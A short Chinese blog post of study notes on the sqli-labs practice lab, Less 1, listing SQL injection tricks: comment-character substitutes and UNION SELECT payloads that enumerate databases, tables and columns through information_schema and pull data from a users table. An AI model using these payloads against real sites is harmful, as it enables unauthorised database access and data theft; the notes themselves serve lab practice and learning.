---
layout: "post"
title: "sqls-lib笔记"
date: "2019-05-11 10:50"
---

## less 1

* 末尾#号可用  --+ -- %23代替

* 查所有数据库
**select group_concat(distinct TABLE_SCHEMA) from information_schema.tables;**

* 查询任意库的表
**union select group_concat(table_name) from information_schema.tables where table_schema=database()**

* 查询字段
**union select group_concat(column_name) from information_schema.columns where table_name='users'**

* 获取信息
**union select 字段 from table**
